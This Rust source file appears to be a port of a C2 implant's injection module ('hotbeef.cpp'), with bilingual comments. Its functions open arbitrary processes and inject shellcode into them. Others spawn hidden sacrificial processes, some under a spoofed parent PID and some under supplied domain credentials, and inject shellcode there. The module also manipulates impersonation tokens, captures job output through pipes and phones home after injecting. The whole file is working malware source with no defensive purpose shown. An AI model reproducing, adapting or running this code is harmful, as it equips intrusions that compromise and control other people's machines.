//! 移植自 hotbeef.cpp —— 与生成并注入 shellcode 相关的函数，集中放在一处。
//! Port of hotbeef.cpp — functions related to spawning and injecting
//! shellcode, grouped into one spot.

use crate::callback::{post_error_d, post_error_dd, Callback};
use crate::commands::CALLBACK_PING;
use crate::inject::{inject_process_logic, is_x64_process};
use crate::jobs::{cleanup_process, pipe_try, process_track};
use crate::parse::DataP;
use crate::process::{spawn_patsy, spawn_patsy_as, spawn_patsy_u};
use crate::tokens::{token_guard_start_maybe, token_guard_stop_maybe};
use core::ffi::c_void;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::Pipes::CreatePipe;
use windows_sys::Win32::System::Threading::{
    GetStartupInfoA, OpenProcess, PROCESS_INFORMATION, PROCESS_CREATE_THREAD,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, Sleep,
    STARTF_USESTDHANDLES, STARTF_USESHOWWINDOW, STARTUPINFOA,
};
use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;

/// 注入一些 shellcode……括起来的东西就是 shellcode 咯。
/// inject some shellcode... enclosed stuff is the shellcode y0
pub fn command_inject_pid(buffer: &[u8], length: usize, x86: bool) {
    let mut owned = buffer.to_vec();
    let mut parser = DataP::init(&mut owned);

    // 从用户提供的数据中提取我们的 PID。
    /* extract our PID from the data the user provided */
    let pid = parser.data_int();

    // 我们想要代码执行开始的偏移。
    /* offset of where we want code execution to start */
    let offset = parser.data_int() as i32;

    // 打开进程，进行一些非常微妙的操纵。
    /* open the process for some oh so subtle manipulation */
    let h_process = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ
                | PROCESS_QUERY_INFORMATION,
            0,
            pid,
        )
    };
    if h_process.is_null() {
        post_error_dd(0x21, pid as i32, unsafe { GetLastError() } as i32);
        return;
    }

    // 检查进程是 x86 还是 x64。
    /* check if the process is x86 or not */
    if x86 && is_x64_process(h_process as isize) {
        post_error_d(0x12, pid as i32);
        return;
    } else if !x86 && !is_x64_process(h_process as isize) {
        post_error_d(0x13, pid as i32);
        return;
    }

    // 在进行注入时考虑我们的 pid 值。
    /* account for our pid value when we do some injection */
    inject_process_logic(
        std::ptr::null_mut(),
        h_process as isize,
        pid,
        parser.data_buffer(),
        parser.data_length(),
        offset,
        std::ptr::null_mut(),
        0,
    );

    // 我们完成了……
    /* we're done... */
    unsafe { CloseHandle(h_process) };
}

/// 按 hotbeef 的方式准备一个 STARTUPINFOA：清零它，获取当前的启动信息，
/// 隐藏窗口并使用给定的标准句柄。
/// Prepare a STARTUPINFOA the way hotbeef does: zero it, grab the current
/// startup info, hide the window and use the given std handles.
unsafe fn si_setup(si: &mut STARTUPINFOA, h_stdout: HANDLE) {
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    GetStartupInfoA(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE as u16;
    si.hStdOutput = h_stdout;
    si.hStdError = h_stdout;
    si.hStdInput = std::ptr::null_mut();
}

/// 注入一些 shellcode……括起来的东西就是 shellcode 咯。
/// inject some shellcode... enclosed stuff is the shellcode y0
pub fn command_inject(buffer: &[u8], length: usize, x86: bool, ignore_token: bool) {
    // 用当前令牌以外的令牌来做这件事。
    /* do this with something other than the current token */
    token_guard_start_maybe(ignore_token);

    // 重置一些东西。
    /* reset some stuff */
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    // 启动一个进程。
    /* start a process */
    unsafe { si_setup(&mut si, std::ptr::null_mut()) };

    // 生成我们的进程。
    /* spawn our process */
    if !spawn_patsy(
        x86,
        ignore_token,
        &mut si as *mut STARTUPINFOA as *mut c_void,
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
    ) {
        token_guard_stop_maybe(ignore_token);
        return;
    }

    // 时序垫片（Win7/Win7 x64 上*必需*——否则 CreateRemoteThread 会报错 8）。
    /* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
    unsafe { Sleep(100) };

    // 注入到进程中。
    /* inject into the process */
    inject_process_logic(
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        pi.hProcess as isize,
        pi.dwProcessId,
        buffer,
        length,
        0,
        std::ptr::null_mut(),
        0,
    );

    // 如果我们有模拟的令牌，就恢复它。
    /* if we have an impersonated token, restore it */
    token_guard_stop_maybe(ignore_token);

    // 清理我们的进程。
    /* clean up our process */
    cleanup_process(&pi);
}

/// 注入一些 shellcode……括起来的东西就是 shellcode 咯。
/// inject some shellcode... enclosed stuff is the shellcode y0
pub fn command_spawnu(buffer: &[u8], length: usize, x86: bool) {
    // 解析它！
    /* parse it! */
    let mut owned = buffer.to_vec();
    let mut parser = DataP::init(&mut owned);
    let ppid = parser.data_int();
    let payload = parser.data_buffer();
    let plength = parser.data_length();

    // 重置一些东西。
    /* reset some stuff */
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    // 启动一个进程。
    /* start a process */
    unsafe { si_setup(&mut si, std::ptr::null_mut()) };

    // 生成我们的进程。
    /* spawn our process */
    if !spawn_patsy_u(
        x86,
        true,
        &mut si as *mut STARTUPINFOA as *mut c_void,
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        ppid,
    ) {
        return;
    }

    // 时序垫片（Win7/Win7 x64 上*必需*——否则 CreateRemoteThread 会报错 8）。
    /* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
    unsafe { Sleep(100) };

    // 注入到进程中。
    /* inject into the process */
    inject_process_logic(
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        pi.hProcess as isize,
        pi.dwProcessId,
        payload,
        plength,
        0,
        std::ptr::null_mut(),
        0,
    );

    // 清理我们的进程。
    /* clean up our process */
    cleanup_process(&pi);
}

pub fn command_spawnas(buffer: &[u8], length: usize, x86: bool) {
    // 设置我们的内存。
    /* setup our memory */
    let mut domain = vec![0u8; 1024];
    let mut user = vec![0u8; 1024];
    let mut pass = vec![0u8; 1024];
    let mut proc: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    // 设置我们的数据解析器。
    /* setup our data parser */
    let mut owned = buffer.to_vec();
    let mut parser = DataP::init(&mut owned);

    // 提取我们的参数。
    /* extract our parameters */
    if parser.data_string(&mut domain, 1024) == 0 {
        return;
    }

    if parser.data_string(&mut user, 1024) == 0 {
        return;
    }

    if parser.data_string(&mut pass, 1024) == 0 {
        return;
    }

    if spawn_patsy_as(
        x86,
        &domain,
        &user,
        &pass,
        &mut proc as *mut PROCESS_INFORMATION as *mut c_void,
    ) {
        // 时序垫片（Win7/Win7 x64 上*必需*——否则 CreateRemoteThread 会报错 8）。
    /* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
        unsafe { Sleep(100) };

        // 注入到进程中。
    /* inject into the process */
        inject_process_logic(
            &mut proc as *mut PROCESS_INFORMATION as *mut c_void,
            proc.hProcess as isize,
            proc.dwProcessId,
            parser.data_buffer(),
            parser.data_length(),
            0,
            std::ptr::null_mut(),
            0,
        );
    }

    // 清理我们的进程。
    /* clean up our process */
    cleanup_process(&proc);
}

/// 从缓冲区提取开头的网络序端口（memcpy + ntohs）。
/// Extract the leading network-order port from the buffer (memcpy + ntohs).
fn extract_port(buffer: &[u8], length: usize) -> (u16, &[u8], usize) {
    if length < 2 {
        return (0, &[], 0);
    }
    let port = u16::from_be_bytes([buffer[0], buffer[1]]);
    (port, &buffer[2..], length - 2)
}

// 注入 shellcode，然后回连以表示已完成。
/* inject shellcode and then call home to indicate it was done */
pub fn command_inject_ping(buffer: &[u8], length: usize, x86: bool, cb: Callback) {
    // 提取我们的端口值。
    /* extract our port value */
    let (port, rest, rest_len) = extract_port(buffer, length);

    // 注入我们的 shellcode。
    /* inject our shellcode */
    command_inject(rest, rest_len, x86, true);

    // 回连……带上……我们的缓冲区。
    /* phone home... with... our buffer */
    cb(&port.to_be_bytes(), 2, CALLBACK_PING);
}

// 注入 shellcode，然后回连以表示已完成。
/* inject shellcode and then call home to indicate it was done */
pub fn command_inject_pid_ping(buffer: &[u8], length: usize, cb: Callback, x86: bool) {
    // 提取我们的端口值。
    /* extract our port value */
    let (port, rest, rest_len) = extract_port(buffer, length);

    // 注入我们的 shellcode。
    /* inject our shellcode */
    command_inject_pid(rest, rest_len, x86);

    // 回连……带上……我们的缓冲区。
    /* phone home... with... our buffer */
    cb(&port.to_be_bytes(), 2, CALLBACK_PING);
}

#[allow(clippy::too_many_arguments)]
fn command_job_spawn_logic(
    _jtype: u32, /* 在 C++ 中同样未使用；仅为保持签名一致 */
               /* unused in the C++ too; kept for signature parity */
    wait: u32,
    offset: i32,
    shellcode: &[u8],
    slen: usize,
    parameter: *mut c_void,
    plen: usize,
    description: &[u8],
    dlen: usize,
    x86: bool,
    ignore_token: bool,
) {
    // 丢弃我们的令牌。
    /* drop our token */
    token_guard_start_maybe(ignore_token);

    // 重置一些东西。
    /* reset some stuff */
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    // 设置我们的安全属性（管道需要）。
    /* setup our security attributes (needed for our pipe) */
    let sa = SECURITY_ATTRIBUTES {
        lpSecurityDescriptor: std::ptr::null_mut(),
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        bInheritHandle: 1,
    };

    // 我们只打算设置一个 stdout 管道。
    /* we're going to setup an stdout pipe only */
    let mut read_stdout: HANDLE = std::ptr::null_mut();
    let mut newstdout: HANDLE = std::ptr::null_mut();
    unsafe {
        CreatePipe(&mut read_stdout, &mut newstdout, &sa, 1024 * 1024);
    }

    // 进一步处理我们的启动信息数据结构。
    /* further process our startup info data structure */
    unsafe { si_setup(&mut si, newstdout) };

    // 执行我们的生成逻辑，拜托了！
    /* do our spawn logic, please! */
    if !spawn_patsy(
        x86,
        ignore_token,
        &mut si as *mut STARTUPINFOA as *mut c_void,
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
    ) {
        token_guard_stop_maybe(ignore_token);
        return;
    }

    // 时序垫片（Win7/Win7 x64 上*必需*——否则 CreateRemoteThread 会报错 8）。
    /* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
    unsafe { Sleep(100) };

    // 注入到进程中。
    /* inject into the process */
    inject_process_logic(
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        pi.hProcess as isize,
        pi.dwProcessId,
        shellcode,
        slen,
        offset,
        parameter,
        plen,
    );

    // 等待用户指定时间，让进程完成。
    /* wait the user specified time for our process to complete */
    if wait > 0 {
        pipe_try(read_stdout as isize, wait);
    }

    // 跟踪这个进程。
    /* track this process */
    process_track(&pi, read_stdout as isize, newstdout as isize, &description[..dlen]);

    // 恢复我们丢弃的令牌（如果有的话）。
    /* restore our dropped token (if there is one) */
    token_guard_stop_maybe(ignore_token);
}

// 综合函数。什么都做一点？
/* omnibus function. Does a little bit of everything? */
pub fn command_job_spawn(buffer: &[u8], length: usize, x86: bool, ignore_token: bool) {
    // 设置我们的本地内存。
    /* setup our local memory */
    let mut description = [0u8; 64];

    // 设置我们的数据解析器。
    /* setup our data parser */
    let mut owned = buffer.to_vec();
    let mut parser = DataP::init(&mut owned);

    // 提取作业输出类型。
    /* extract the job output type */
    let jtype = parser.data_short() as u32;

    // 提取等待时间。
    /* extract the wait time */
    let wait = parser.data_short() as u32;

    // 提取反射加载器偏移，拜托了。
    /* extract the reflective loader offset pls */
    let offset = parser.data_int() as i32;

    // 提取我们的描述。
    /* extract our description */
    let dlen = parser.data_string(&mut description, 64);

    // 提取我们的参数。
    /* extract our parameter */
    let plen = parser.data_int() as usize;
    let parameter: *mut c_void = if plen > 0 {
        match parser.data_ptr(plen) {
            Some(s) => s.as_ptr() as *mut c_void,
            None => std::ptr::null_mut(),
        }
    } else {
        std::ptr::null_mut()
    };

    // 提取我们的 shellcode。
    /* extract our shellcode */
    let shellcode = parser.data_buffer();
    let slen = parser.data_length();

    // 调用我们的命令生成逻辑。
    /* call our command spawn logic */
    command_job_spawn_logic(
        jtype,
        wait,
        offset,
        shellcode,
        slen,
        parameter,
        plen,
        &description,
        dlen,
        x86,
        ignore_token,
    );
}
